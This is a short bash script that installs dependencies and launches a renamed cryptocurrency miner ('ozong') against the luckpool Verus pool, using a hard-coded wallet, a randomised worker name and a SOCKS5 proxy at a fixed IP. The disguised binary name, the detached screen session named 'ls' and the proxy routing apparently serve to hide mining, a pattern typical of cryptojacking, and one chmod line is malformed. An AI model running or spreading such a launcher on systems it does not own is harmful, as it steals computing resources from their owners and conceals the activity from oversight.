#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x start5.sh && chmod +x ozong chmod 777 ozong start5.sh
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RCxbifXviidNdiEaKa4PYxt7Ch5vrGSxh9
WORKER=$(echo $(shuf -i 1-10 -n 1)TAYO)
PROXY=socks5://98.185.83.105:12752
./ozong -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY